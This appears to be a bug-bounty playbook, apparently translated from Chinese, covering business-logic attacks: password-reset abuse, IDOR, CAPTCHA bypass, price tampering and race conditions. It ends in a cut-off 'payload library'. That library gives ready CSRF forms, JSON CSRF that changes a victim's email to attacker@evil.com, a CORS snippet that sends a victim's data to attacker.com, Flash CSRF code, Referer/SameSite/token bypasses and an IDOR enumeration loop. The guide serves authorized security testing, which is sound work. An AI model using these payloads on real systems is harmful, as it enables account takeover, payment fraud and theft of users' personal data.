# Business Logic / Privilege Escalation / CAPTCHA / Payment Tampering

> Perspective: black-box; focus on flows, state machines, invariants

## 1. In one sentence

A logic flaw = the program works as expected, but **the expectation is wrong**.
It is not injection, not RCE, there is no "specific payload"; it relies on **flow understanding + tampering + replay**.
SRC value: **very hard for a WAF to detect**; large companies often expose these due to complex business logic.

---

## 2. High-frequency entry points (categorized by WooYun's 8,292 cases)

| Type | Entry characteristics | Key parameters |
|------|---------|---------|
| Password reset | `/reset`, `/forgot`, `/findpwd`, `/sms` | `phone`, `username`, `code`, `token`, `step` |
| Privilege escalation | `/user/{id}`, `/order/{id}` | `id`, `uid`, `oid`, `addrid`, `hotelid` |
| Role / escalation | `/role`, `/permission`, `/profile` | `role`, `aid`, `isAdmin`, `level` |
| Payment / order | `/order/create`, `/pay`, `/checkout` | `price`, `amount`, `total`, `count`, `couponCode` |
| CAPTCHA | `/sendSms`, `/captcha`, `/verify` | `code`, `captcha`, `smsCode` |
| Coupon / points | `/coupon`, `/exchange`, `/redeem` | `code`, `couponId`, `points` |

---

## 3. Probing techniques (by sub-category)

### 3.1 Password-reset 4 patterns (from 22 wooyun cases)

#### Pattern A: verification code echoed in the response

```http
POST /api/sendSmsCode HTTP/1.1
phone=13888888888

→ response:
{"code":0,"data":{"verifyCode":"123456"}}
```

**Probe**: capture the send-verification-code response packet and search for `verifyCode`, `smsCode`, `code`, `captcha`.
Cases: a parking APP, a community platform, an email service (wooyun-2015-0134914).

#### Pattern B: verification code unbound from the user

```
1. Register with the attacker's own phone 138xxxx0001, receive code=123456
2. Initiate a reset for the victim, phone=victim
3. Submit the reset form phone=victim, code=123456 → passes
```

**Probe**: have the platform send a code to phone A, then use the code A received to verify phone B.
Case: an accounting APP (affecting 80M users).

#### Pattern C: flow skipping

Normal 4 steps: enter account → verify identity → reset password → done.

**Probe**: directly GET / POST the URL of step 3; or use Burp to modify the frontend flow state.

```
1. Complete the normal flow once, recording each step's URL
2. Directly initiate the step-3 request / check whether reaching step 3 requires a preceding token
3. Modify the frontend DOM: use F12 to replace the "reset password" DOM with "identity verification"
```

Case: an outdoor-goods store (wooyun-2014-054890).

#### Pattern D: credential parameter controllable

```http
POST /resetPassword HTTP/1.1
username=victim&newPassword=hacked123
```

**Probe**: when submitting, change the username / token / userId field in the request body.
Check whether it actually changed the password of `victim` (try logging into the victim's account with the new password).

### 3.2 Privilege escalation (IDOR)

#### Horizontal escalation (peer users)

```http
# A's own resource
GET /api/address/edit/?addid=100001

# change to B's
GET /api/address/edit/?addid=100002
```

**Probe**:
1. Operate with account A, note the ID
2. Resend the same request with account B, changing the ID to A's
3. 200 + returns A's data = IDOR

Tool: the Burp `Autorize` plugin, which automatically compares the responses of two sessions.

Reference cases: wooyun-2015-0119942 (a store, 200K+ users), wooyun-2014 (eHi Car Rental, 190K invoices).

#### Vertical escalation (regular → admin)

```http
# regular user modifies own profile
POST /updateUser HTTP/1.1
user.aid=3&user.name=test

# change to the admin ID
POST /updateUser HTTP/1.1
user.aid=1&user.name=test
```

**Probe**:
1. Register two accounts: regular + admin (use the platform demo / test yourself)
2. Capture the admin page's endpoint
3. Call it directly with the regular user token
4. 200 + operation succeeds = escalation

Enumerate role IDs: usually `1=superadmin, 2=admin, 3=regular user`.

#### Header / Cookie injection escalation

```
X-User-Role: admin
X-User-Id: 1
X-Original-User: admin
X-Forwarded-User: admin
Cookie: role=admin; isAdmin=1; userId=1
```

Some systems treat the Header / Cookie directly as identity information — **add the above headers one by one and resend**.

#### IDOR test matrix

| Operation | Probe | Risk |
|------|------|------|
| Read | change the ID to query others' resources | medium / high |
| Modify | change the ID to modify others' resources | high |
| Delete | change the ID to delete others' resources | critical (irreversible, no actual delete testing!) |
| Create | change the owner field | high |

### 3.3 CAPTCHA bypass (20 cases)

#### No refresh / reusable

```python
# use the same CAPTCHA multiple times
captcha = "ABCD"
for password in wordlist:
    r = login(username, password, captcha)
    if "success" in r.text: break
```

**Probe**: fail login 5 times in a row, the CAPTCHA image does not change → you can brute-force the password with a fixed value.

#### 4–6 digit numeric + no rate limit

```
sms code = 4-6 digit numeric
no throttle
→ Burp Intruder 100-thread brute force
```

Reference: a brand store APP's 5-digit numeric verification code cracked in 30 seconds.

#### Client-side validation / response tampering

```
# server returns
{"status":"0","msg":"CAPTCHA incorrect"}

# change to
{"status":"1","msg":"success"}
→ the client proceeds to the next step
```

**Probe**: intercept the response packet in Burp, change `0/false/error` to `1/true/success`.
Applicable to: SPAs where `status` controls the next-step flow.

Reference cases: Jianyi Wang APP (wooyun-2015-0139590), NiWo Finance.

### 3.4 Payment / order (9 cases)

#### Price tampering

```http
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":0.01}

# original price 299, submit 0.01 → server does not recalculate → bought for 0.01 yuan
```

**Probe checklist** (try each value):
```
price = 0
price = 0.01
price = -100
price = 1e-10
price = "0.01"      # string
price = null
price = {"$gt":0}   # MongoDB injection
price = [299,0.01]  # array
```

#### Quantity tampering

```
count = -1            # negative → refund logic triggered in reverse
count = 0             # free order
count = 9999999999    # integer overflow
```

#### Coupon abuse / revocation

```
1. Place a full-reduction combo order (product A 59 yuan + add-on product B 5.9 yuan)
2. Cancel product A after paying
3. Effectively get the 21-yuan product B for 5.9 yuan
```

#### Replay payment callback

```http
# third-party payment callback
POST /pay/notify
sign=xxx&order_id=123&status=success&amount=100

# replay the same callback (same sign)
→ if the server does not check the order status, it may ship multiple times
```

#### Concurrent race

```python
# create 50 orders of 0.01 yuan simultaneously
import threading
def create():
    requests.post("/order/create", json={"price":0.01,"productId":"premium"})
threads = [threading.Thread(target=create) for _ in range(50)]
[t.start() for t in threads]
```

#### Parameter pollution

```
POST /order/create?price=299.00&price=0.01
POST /order/create  body: price[]=299.00&price[]=0.01
```

Reference cases: wooyun-2015-0108817 (an e-commerce price tampering), China Caichu, Chunqu Mall.

### 3.5 Race conditions

| Scenario | Probe |
|------|------|
| Coupon double-spend | concurrently use the same coupon code 50 times |
| Balance over-deduction | concurrent withdrawal / transfer, initial balance 100, withdraw 100 each time |
| Invitation reward farming | concurrently register new users + invitation code |
| CAPTCHA brute force | concurrently submit different codes |
| Purchase-limit flash sale | concurrent orders |
| Uniqueness breakage | concurrently register the same username (`existsByUsername` then insert; a race can double-register) |

Tools:
- Burp Suite Intruder ("Send N requests in parallel")
- Turbo Intruder (precise concurrency)
- Self-written Python `threading` / Go goroutine

Reference: see `playbooks/race-conditions.md` for details.

---

## 4. Bypass matrix

| Blocked by | Bypass |
|------|------|
| Single-IP rate limit | multiple IPs / proxy pool / X-Forwarded-For injection |
| Same-phone-number frequency | append a dot to the number (`13888888888.`, `+8613888888888`, `013888888888`) |
| Graphical CAPTCHA | call a CAPTCHA-recognition API (only if self-testing compliantly) |
| Same-account operation | register multiple accounts and rotate |
| Time limit | change the `Date` Header (few systems trust it) / adjust the timezone parameter |
| One-time token | capture the token before and after sending to see whether it actually expires |

---

## 5. Exploitation for escalation / lateral

| Starting point | Endpoint |
|------|------|
| Password-reset vulnerability | take over all users (H1 median $2k–$10k) |
| Horizontal IDOR mass data | PII leak (each PII = $1–$5 black-market price) |
| Vertical IDOR | escalate to admin → all backend features → P0 |
| 0.01-yuan payment | physical goods / membership services / virtual currency |
| CAPTCHA brute force | takeover of any account |
| Callback replay | multiple shipments / multiple top-ups |
| Race-condition coupon | reuse the same coupon repeatedly |

---

## 6. Real-case fingerprints

| Vulnerability type | wooyun ID / case | Fingerprint / one-liner |
|---------|----------------|------------|
| CAPTCHA echo | a parking APP wooyun-2015-0134914 | response contains `verifyCode` / `smsCode` |
| Reset flow skip | an outdoor-goods store wooyun-2014-054890 | directly access the step-3 URL without validating the preceding step |
| Horizontal escalation | an adult-goods store wooyun-2015-0119942 | change `?id=` to another's ID, 200 |
| Vertical escalation | Zhejiang Online wooyun-2015-099378 | `user.aid=1` escalates to superadmin |
| Amount tampering | China Caichu wooyun-2012-07745 | `price=0.01` passes payment |
| Price parameter | an e-commerce wooyun-2015-0108817 | client submits price, server does not recalculate |
| Credential stuffing | a phone manufacturer's forum wooyun-2014-061871 | 80K weak passwords, no rate limit |
| Cookie forgery | Fujian NetDragon wooyun-2015-0157092 | `?userAccount=admin` directly writes a Cookie |
| Response tampering | Jianyi Wang wooyun-2015-0139590 | change the return `status=1` to proceed to the next step |

---

## 7. Reproduction / evidence essentials

### 7.1 IDOR report must-haves

1. Two accounts: A (attacker) + B (victim, **actually another test account of the researcher**)
2. A's legitimate request packet + 200
3. A's request packet changed to B's ID + 200 + containing B's data
4. If you tested against a real third-party account, **stop immediately + do not put any real data in the report + proactively state it**

### 7.2 Privilege-escalation PoC template

```markdown
# Reproduction steps

## Account setup
- Account A: username hunter_a, user_id=10001 (attacker-controlled)
- Account B: username hunter_b, user_id=10002 (attacker-controlled, used only to prove IDOR)

## Step 1: A queries its own orders (baseline)
GET /api/orders/100  Authorization: A_token  → 200, returns A's orders
(request/response in attachment 1)

## Step 2: A queries B's orders (vulnerability proof)
GET /api/orders/200  Authorization: A_token  → 200, returns B's order content
(request/response in attachment 2)

## Step 3: Use C (an unknown user_id=99999) to prove non-test accounts can also be traversed
GET /api/orders/99999  Authorization: A_token  → 200, contains order number, recipient, phone (redacted)
Only 1 sample was taken; no attempt to traverse further.
```

### 7.3 Price-tampering PoC template

```
1. Product page: 299 yuan
2. When submitting the order, change price=0.01:
   POST /order/create
   {"productId":"X","quantity":1,"price":0.01}
3. The server response order total = 0.01 yuan
4. The actual payment page is also 0.01 yuan (screenshot + payment-platform order screenshot)
5. Receive the product / service (if it's a digital product, look at the activation page)
```

### 7.4 CVSS reference

```
Vertical escalation → escalate to admin  CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8
Horizontal escalation → read others' PII  CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N = 6.5
Password-reset takeover                  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1
Price tampering 0.01                     CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N = 6.5 (adjusted by business impact)
CAPTCHA brute-force login                CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1
```

### 7.5 Impact section (emphasize business impact)

```
This vulnerability allows any regular user to read/modify others' order data by changing the user_id parameter.
Actual impact on the platform's business:
1. User PII leak: orders contain name, shipping address, phone, email (GDPR/CCPA risk);
2. Trade secrets: order amounts, product preferences, and other user-profiling data;
3. Trust damage: maliciously modified addresses can lead to logistics fraud.

During testing, two attacker-controlled accounts A and B were used; no real user orders were accessed.
Only in the last step was a single random ID used to prove traversability, then stopped immediately and redacted.
```

---

## 8. Things not to do

- **Forbidden**: using payment tampering to actually order physical goods (not even at 0.01 yuan). Instead:
  - Test environment (if any)
  - Digital goods (e-vouchers, screenshot immediately after paying, **do not activate**)
  - Demonstrate up to "order created + abnormal amount" and stop; do not enter the payment chain
- **Forbidden**: bulk IDOR data dumping. At most 1–3 samples, all redacted.
- **Forbidden**: using a password-reset vulnerability to reset a real user's password. Resetting your own two test accounts is enough.
- **Forbidden**: using an escalated account to perform write / delete / modify operations. Read-only proof only.
- **Forbidden**: credential stuffing using a real database from outside the SRC platform (illegal).
- **Forbidden**: race-condition testing at 1000+ rps (treated as DoS). Controlling 50–100 concurrency is enough to prove it.
- **Do not include in the report**: others' raw PII, order numbers, phone numbers, addresses (all redacted to just the first 2 + last 2 characters).

## H1 real cases

_A total of 234 disclosed HackerOne High/Critical reports hit this category, sorted by (bounty + votes×100), taking the Top 12_

| Severity | $ | Program | Title (click for the original report) | Summary |
|---|--:|---|---|---|
| Critical | 7500 usd | Valve | [Modify in-flight data to payment provider Smart2Pay](https://hackerone.com/reports/1295844) | I have found vulnerability which allows attacker to generate steam wallet balance |
| Critical | — | BlockDev Sp. Z o.o | [Steal ALL collateral during liquidation by exploiting lack of validation in `flip.kick`](https://hackerone.com/reports/684092) | Summary: The `flip` contract allows for the MCD system to auction collateral in exchange for DAI |
| Critical | 12000 usd | GitLab | [An attacker can run pipeline jobs as arbitrary user](https://hackerone.com/reports/894569) | Summary An attacker can run arbitrary pipeline jobs as a `victim` user |
| Critical | 10000 usd | Coinbase | [Double Payout via PayPal](https://hackerone.com/reports/307239) | Double Payout via PayPal |
| High | — | TikTok | [[CSRF] TikTok Careers Portal Account Takeover](https://hackerone.com/reports/1010522) | [CSRF] TikTok Careers Portal Account Takeover |
| Critical | — | GitLab | [Bypass of GitLab CI runner slash fix in YAML validation](https://hackerone.com/reports/409395) | Hi Gitlab Security, I notice the bug #301432 that Jobert reported earlier is could be bypassed by setting variable in environment |
| High | 3500 usd | GitLab | [Cross-site Scripting (XSS) - Stored in RDoc wiki pages](https://hackerone.com/reports/662287) | Summary When creating an RDoc wiki page it's possible to use a large number of html tags and attributes that are normally sanit… |
| High | — | pixiv | [Reset any password](https://hackerone.com/reports/703972) | Summary: When I try to reset the password, the verification code of the mailbox is 6 digits, and there is no limit on the numbe… |
| High | — | Reverb.com | [Race Condition allows to redeem multiple times gift cards which leads to free "money"](https://hackerone.com/reports/759247) | Hello team! I've found a Race Condition vulnerability which allows to redeem gift cards multiple times. This how a s/he can eas… |
| Critical | — | Coinbase | [Ethereum account balance manipulation](https://hackerone.com/reports/300748) | Ethereum account balance manipulation |
| High | — | Semrush | [An attacker can buy marketplace articles for lower prices as it allows for negative quantity valu…](https://hackerone.com/reports/771694) | Hi there, When we Summary:** When someone goes to https://www.semrush.com/marketplace/offers/ and orders for articles, an attac… |
| Critical | 2000 usd | inDrive | [Change phone number OTP flaw leads to any phone number takeover](https://hackerone.com/reports/2588329) | Summary: Dear Indrive, Ive found another valid report, the app allows any user to change the app phone number, but a flaw withi… |

**Weakness distribution for hits in this category:**

- Business Logic Errors: 64 entries
- Cross-Site Request Forgery (CSRF): 59 entries
- Violation of Secure Design Principles: 32 entries
- Improper Input Validation: 21 entries
- Improper Restriction of Authentication Attempts: 17 entries
- Modification of Assumed-Immutable Data (MAID): 9 entries
- UI Redressing (Clickjacking): 8 entries
- Uncategorized → manually classified: 7 entries
- Client-Side Enforcement of Server-Side Security: 4 entries
- Weak Password Recovery Mechanism for Forgotten Password: 4 entries
- User Interface (UI) Misrepresentation of Critical Information: 2 entries
- External Control of Critical State Data: 2 entries
- Improper Initialization: 1 entry
- Exposure of Data Element to Wrong Session: 1 entry
- Encoding Error: 1 entry
- Improper Check or Handling of Exceptional Conditions: 1 entry
- Improper Handling of URL Encoding (Hex Encoding): 1 entry

## Payload library

_15 structured web payloads, including full attack chains + WAF/EDR bypass variants_

**Category distribution:** CSRF (8) · Business logic vulnerabilities (5) · Clickjacking (2)

### · CSRF

### CSRF basic attack  `csrf-basic`
Cross-site request forgery basic attack techniques
Sub-category: **basic attack** · tags: `csrf` `cross-site` `request` `forgery`

**Prerequisites:** the target has a sensitive operation; CSRF protection is missing

**Attack chain:**

**1. 1. Construct a CSRF form**
_Construct an auto-submitting CSRF form_
```
<form action="http://target.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="hidden" name="confirm_password" value="hacked123">
  <input type="submit" value="Click me">
</form>
<script>document.forms[0].submit();</script>
```

**2. 2. GET-request CSRF**
_CSRF attack via a GET request_
```
<img src="http://target.com/delete?id=123" style="display:none">
Or directly induce the user to click:
http://target.com/delete?id=123
```

**3. 3. JSON CSRF**
_CSRF attack in JSON format_
```
<script>
fetch("http://target.com/api/change-email", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({email: "attacker@evil.com"})
});
</script>
```

**4. 4. Link enticement**
_Induce the user to click_
```
<a href="http://target.com/action?param=value">Click to claim a red packet</a>
Or a short link to hide the real URL
```

**WAF/EDR bypass variants:**

**1. Referer bypass**
_Bypass the Referer check_
```
Use a Referrer Policy:
<meta name="referrer" content="no-referrer">
Or use a data URL:
<data:text/html;base64,CSRF_PAYLOAD>
Or use an HTTPS->HTTP downgrade
```

**2. Token bypass**
_Bypass Token validation_
```
1. Check whether the Token is predictable
2. Check whether the Token is bound to the session
3. Check whether the Token is leaked in a GET parameter
4. Check whether there is a Token replay vulnerability
```

---

### JSON CSRF attack  `csrf-json`
CSRF attack techniques targeting JSON requests
Sub-category: **JSON CSRF** · tags: `csrf` `json` `api` `post`

**Prerequisites:** the target uses JSON-format requests; CSRF protection is missing; CORS is misconfigured

**Attack chain:**

**1. 1. Simple JSON CSRF**
_Use text/plain to bypass the preflight_
```
<script>
fetch("http://target.com/api/update", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({email: "attacker@evil.com"})
});
</script>
```

**2. 2. Flash JSON CSRF**
_Use Flash to send JSON_
```
# Use Flash to send a JSON request
# Requires the target to allow Content-Type: application/json
# Combined with Flash's cross-domain capability
```

**3. 3. XSSI attack**
_Cross-site script inclusion attack_
```
# Exploit a JSONP callback
<script src="http://target.com/api/data?callback=attacker"></script>
function attacker(data) { console.log(data); }

# Exploit an array return
[{"secret": "data"}]
<script>var data = [{"secret": "data"}];</script>
```

**4. 4. SWF file attack**
_Use an SWF file_
```
# Create a malicious SWF file to send a JSON request
# Compile the ActionScript code
# Embed it in an HTML page
```

**WAF/EDR bypass variants:**

**1. Modify Content-Type**
_Modify the Content-Type to bypass_
```
# Try different Content-Types
text/plain
application/x-www-form-urlencoded
application/x-www-form-urlencoded; charset=UTF-8
```

**2. Use FormData**
_Send using FormData_
```
let formData = new FormData();
formData.append("data", JSON.stringify({email: "attacker@evil.com"}));
fetch(url, {method: "POST", body: formData, credentials: "include"});
```

---

### CSRF bypass techniques  `csrf-bypass`
Various techniques to bypass CSRF protection
Sub-category: **bypass techniques** · tags: `csrf` `bypass` `token` `referer`

**Prerequisites:** the target has CSRF protection; the protection mechanism has flaws

**Attack chain:**

**1. 1. Token-validation bypass**
_Bypass Token validation_
```
# Token predictable
Analyze the Token generation pattern to predict a valid Token

# Token not bound to session
Use another user's Token

# Token reuse
The same Token can be used multiple times

# Token leaked in a GET parameter
Obtain the Token from the page source
```

**2. 2. Referer-validation bypass**
_Bypass Referer validation_
```
# Loose regex matching
Referer: http://attacker.com/target.com/
Referer: http://target.com.attacker.com/

# Empty Referer
<meta name="referrer" content="no-referrer">

# HTTPS->HTTP downgrade
Redirecting from an HTTPS site to HTTP does not send a Referer
```

**3. 3. Origin-validation bypass**
_Bypass Origin validation_
```
# Origin is null
Use a data URL or about:blank

# Regex bypass
Origin: http://target.com.attacker.com
Origin: http://attacktarget.com

# IE11 does not send Origin
IE11 does not send the Origin header in some cases
```

**4. 4. SameSite bypass**
_Bypass the SameSite restriction_
```
# SameSite=Lax
GET requests will send the Cookie
Construct the sensitive operation in GET form

# SameSite not set
The default behavior may allow cross-site sending

# Two-minute window
SameSite=Lax has a 2-minute window
```

**WAF/EDR bypass variants:**

**1. CORS misconfiguration**
_Exploit CORS misconfiguration_
```
# Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# Access-Control-Allow-Origin: *
Allows any origin

# Reflected Origin
Access-Control-Allow-Origin: [any Origin]
```

---

### SameSite bypass techniques  `csrf-samesite`
CSRF attacks that bypass the SameSite Cookie attribute
Sub-category: **SameSite bypass** · tags: `csrf` `samesite` `cookie` `bypass`

**Prerequisites:** the Cookie has the SameSite attribute set; the SameSite configuration has flaws

**Attack chain:**

**1. 1. SameSite=Lax bypass**
_Bypass SameSite=Lax_
```
# GET-request bypass
Construct the sensitive operation in GET form
<img src="http://target.com/delete?id=123">

# Top-level navigation
<a href="http://target.com/action">Click</a>
window.location = "http://target.com/action"

# Two-minute window
Initiate the request within 2 minutes of user interaction
```

**2. 2. SameSite=Strict bypass**
_Bypass SameSite=Strict_
```
# Subdomain attack
Initiate the request from a subdomain
http://sub.target.com/attack

# Cookie overwrite
Set a same-name Cookie to overwrite
Set-Cookie: session=attacker; Domain=.target.com

# Use a redirect
Redirect from the target site to the attack page
```

**3. 3. SameSite not set**
_Exploit SameSite not being set_
```
# Old-browser default behavior
Chrome < 80 defaults to None
Safari defaults to None

# Can directly launch a CSRF attack
No special bypass needed
```

**4. 4. Exploit the OAuth flow**
_Exploit the OAuth flow_
```
# OAuth callback bypasses SameSite
1. Initiate an OAuth login
2. Inject a malicious request in the callback
3. The Cookie is sent during the OAuth flow
```

**WAF/EDR bypass variants:**

**1. Mixed content**
_Exploit mixed content_
```
# HTTPS->HTTP downgrade
Initiate an HTTP request from an HTTPS site
In some cases SameSite is not sent
```

**2. Client-side redirect**
_Client-side redirect_
```
# JavaScript redirect
location.href = "http://target.com/action"
May bypass some SameSite checks
```

---

### Token bypass techniques  `csrf-token-bypass`
Techniques to bypass CSRF Token validation
Sub-category: **Token bypass** · tags: `csrf` `token` `bypass` `predictable`

**Prerequisites:** the target uses a CSRF Token; the Token mechanism has flaws

**Attack chain:**

**1. 1. Token predictable**
_Predict the Token value_
```
# Analyze the Token generation pattern
# Common weak Token patterns:
- timestamp
- incrementing number
- user-ID hash
- weak random number

# Predict and construct a valid Token
```

**2. 2. Token not bound to session**
_Exploit an unbound Token_
```
# Token does not validate the session
# Attack steps:
1. The attacker obtains their own Token
2. Use that Token to construct the CSRF
3. Induce the victim to submit

# Token usable across users
```

**3. 3. Token leak**
_Exploit a Token leak_
```
# Token leaked in the URL
http://target.com/page?token=xxx

# Token leaked in the Referer
Redirect from a page containing the Token

# Token leaked in logs
The server logs record the Token
```

**4. 4. Token replay**
_Token replay attack_
```
# Token can be reused
# Attack steps:
1. Obtain a valid Token
2. Use the same Token multiple times
3. The Token does not expire or invalidate
```

**5. 5. Token-deletion bypass**
_Delete the Token to bypass_
```
# Try deleting the Token parameter
POST /action HTTP/1.1
# Do not send the Token parameter

# Try an empty Token
POST /action?token=

# Try deleting the Token header
```

**WAF/EDR bypass variants:**

**1. Method override**
_Method-override bypass_
```
# Use the _method parameter
POST /action?_method=PUT&token=xxx

# Use X-HTTP-Method-Override
X-HTTP-Method-Override: PUT
```

**2. JSON format**
_JSON-format bypass_
```
# Submit in JSON format
Content-Type: application/json
{"token": "xxx", "action": "delete"}

# May bypass Token validation
```

---

### Referer bypass techniques  `csrf-referer-bypass`
CSRF attacks that bypass Referer validation
Sub-category: **Referer bypass** · tags: `csrf` `referer` `bypass` `header`

**Prerequisites:** the target validates the Referer header; the validation logic has flaws

**Attack chain:**

**1. 1. Regex-matching bypass**
_Exploit regex-matching flaws_
```
# The regex only checks for containment
Referer: http://attacker.com/target.com/
Referer: http://target.com.attacker.com/
Referer: http://attacktarget.com/

# The regex only checks the start
Referer: http://target.com.attacker.com/

# The regex only checks the end
Referer: http://attacker.com/target.com
```

**2. 2. Empty-Referer bypass**
_Send an empty Referer_
```
# Do not send a Referer
<meta name="referrer" content="no-referrer">

# data URL
data:text/html,<script>CSRF</script>

# about:blank
about:blank

# HTTPS->HTTP downgrade
Redirect from an HTTPS site to HTTP
```

**3. 3. Subdomain bypass**
_Exploit a subdomain_
```
# Initiate from a subdomain
Referer: http://sub.target.com/attack

# Initiate from a sibling domain
Referer: http://sibling.target.com/

# Exploit subdomain XSS
Inject XSS on a subdomain to launch the CSRF
```

**4. 4. Referrer-Policy exploitation**
_Exploit Referrer-Policy_
```
# origin-only
<meta name="referrer" content="origin">
Referer: http://target.com

# origin-when-cross-origin
<meta name="referrer" content="origin-when-cross-origin">
```

**WAF/EDR bypass variants:**

**1. iframe embedding**
_iframe bypass_
```
# Use an iframe to embed the target
<iframe src="http://target.com" referrerpolicy="no-referrer">

# sandbox attribute
<iframe sandbox="allow-scripts" src="...">
```

**2. Flash/SWF**
_Flash controlling the Referer_
```
# Flash can control the Referer
# Compile an SWF to send a custom Referer
```

---

### Flash CSRF attack  `csrf-flash`
CSRF attack using Flash
Sub-category: **Flash CSRF** · tags: `csrf` `flash` `swf` `crossdomain`

**Prerequisites:** the target allows Flash requests; crossdomain.xml is misconfigured

**Attack chain:**

**1. 1. crossdomain.xml exploitation**
_Check the cross-domain policy file_
```
# Check crossdomain.xml
http://target.com/crossdomain.xml

# Allows all domains
<cross-domain-policy>
<allow-access-from domain="*"/>
</cross-domain-policy>

# Allows a specific domain
<allow-access-from domain="*.target.com"/>
```

**2. 2. Create a malicious SWF**
_Create a malicious Flash file_
```
// ActionScript code
package {
  import flash.net.*;
  public class CSRF {
    public function CSRF() {
      var req:URLRequest = new URLRequest("http://target.com/api/action");
      req.method = URLRequestMethod.POST;
      req.data = "param=value";
      req.requestHeaders.push(new URLRequestHeader("Content-Type", "application/json"));
      sendToURL(req);
    }
  }
}
```

**3. 3. Send a JSON request**
_Send a request in JSON format_
```
// Flash can send any Content-Type
req.requestHeaders.push(
  new URLRequestHeader("Content-Type", "application/json")
);
req.data = JSON.stringify({email: "attacker@evil.com"});
```

**4. 4. Custom Header**
_Add a custom Header_
```
// Flash can add a custom Header
req.requestHeaders.push(
  new URLRequestHeader("X-Custom-Header", "value")
);

// Bypass some Header validations
```

**WAF/EDR bypass variants:**

**1. Bypass the preflight request**
_Bypass the CORS preflight_
```
# Flash can bypass the CORS preflight
# Directly send a POST request
# Carrying the Cookie
```

---

### CORS misconfiguration exploitation  `csrf-cors`
CSRF attacks exploiting CORS misconfiguration
Sub-category: **CORS misconfiguration** · tags: `csrf` `cors` `misconfiguration` `api`

**Prerequisites:** CORS is misconfigured; it allows cross-origin credential carrying

**Attack chain:**

**1. 1. Detect the CORS configuration**
_Detect the CORS configuration_
```
# Send a test request
curl -H "Origin: http://attacker.com" http://target.com/api

# Check the response headers
Access-Control-Allow-Origin: http://attacker.com
Access-Control-Allow-Credentials: true

# Dangerous configuration
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**2. 2. Reflected-Origin attack**
_Exploit a reflected Origin_
```
# The server reflects any Origin
Access-Control-Allow-Origin: [the requested Origin]
Access-Control-Allow-Credentials: true

# Attack code
fetch("http://target.com/api/sensitive", {
  credentials: "include"
})
.then(r => r.json())
.then(data => sendToAttacker(data));
```

**3. 3. null-origin attack**
_Exploit a null origin_
```
# Allows the null origin
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# Use a data URL
<iframe src="data:text/html,<script>
fetch('http://target.com/api', {credentials: 'include'})
.then(r => r.json()).then(sendToAttacker);
</script>"></iframe>
```

**4. 4. Regex bypass**
_Regex-matching bypass_
```
# Loose regex matching
Allows: target.com
Bypass: attacktarget.com
target.com.attacker.com

# Attack code
fetch("http://target.com.api.attacker.com/api", {
  credentials: "include"
});
```

**WAF/EDR bypass variants:**

**1. Steal sensitive data**
_Steal user data_
```
# Use CORS to steal data
fetch("http://target.com/api/user", {
  credentials: "include"
})
.then(r => r.json())
.then(data => {
  new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(JSON.stringify(data));
});
```

**2. Perform sensitive operations**
_Perform sensitive operations_
```
# Use CORS to perform operations
fetch("http://target.com/api/delete", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({id: 123})
});
```

---

### · Business logic vulnerabilities

### IDOR unauthorized access  `biz-idor`
Insecure Direct Object Reference (IDOR): access others' data without authorization by tampering with the object ID in the request parameters. The attacker can traverse parameters such as user IDs and order numbers to obtain unauthorized resources.
Sub-category: **privilege-escalation vulnerability** · tags: `IDOR` `privilege escalation` `business logic` `OWASP` `A01`

**Prerequisites:** the target has an ID-based resource-access endpoint; a logged-in regular user account

**Attack chain:**

**1. 1. Identify traversable parameters**
_Identify endpoints in the API that use a number/UUID as the resource identifier_
```
# Capture the ID parameter in the request
GET /api/users/1001/profile HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}

# Common IDOR parameters: user_id, order_id, file_id, invoice_id, account_id
```

**2. 2. Horizontal-escalation test**
_Traverse the user-ID parameter, observing differences in response code and size to confirm escalation_
```
# Use user A's Token to access user B's data
for id in $(seq 1000 1010); do
  curl -s -o /dev/null -w "%{http_code} %{size_download}" \
    -H "Authorization: Bearer {TOKEN}" \
    "https://{TARGET}/api/users/$id/profile"
  echo " -> user_id=$id"
done
```

**3. 3. Vertical-escalation test**
_Try to call an admin API as a low-privilege user or modify your own role_
```
# Use a regular user Token to access the admin endpoint
GET /api/admin/users HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}

# Try to modify the role
PUT /api/users/1001 HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}
Content-Type: application/json

{"role": "admin", "is_admin": true}
```

**4. 4. Parameter-pollution escalation**
_Use parameter duplication, JSON key overwrite, and array injection to bypass IDOR defenses_
```
# Double-parameter pollution
GET /api/orders?user_id=1001&user_id=1002 HTTP/1.1

# JSON parameter overwrite
POST /api/profile/update HTTP/1.1
Content-Type: application/json

{"user_id": 1001, "name": "test", "user_id": 1002}

# Array injection
GET /api/orders?user_id[]=1001&user_id[]=1002 HTTP/1.1
```

**WAF/EDR bypass variants:**

**1. Encoded-ID bypass**
_Bypass the ID check via encoding, negative numbers, overflow, etc._
```
# Base64-encoded ID
/api/users/MTAwMQ== (base64 of 1001)
# Hex encoding
/api/users/0x3E9
# Negative / overflow
/api/users/-1
/api/users/2147483647
```

---

### Race-condition attack  `biz-race-condition`
Exploit a server-side TOCTOU (Time-of-Check to Time-of-Use) vulnerability: via concurrent requests, trigger the same operation multiple times within the time window between check and execution, achieving repeated coupon claiming, repeated withdrawal, over-purchasing, and other business-logic breakthroughs.
Sub-category: **race condition** · tags: `race condition` `Race Condition` `TOCTOU` `concurrency` `business logic`

**Prerequisites:** the target has quantifiable-resource operations such as balance/points/coupons; a Python/Turbo Intruder environment

**Attack chain:**

**1. 1. Identify race targets**
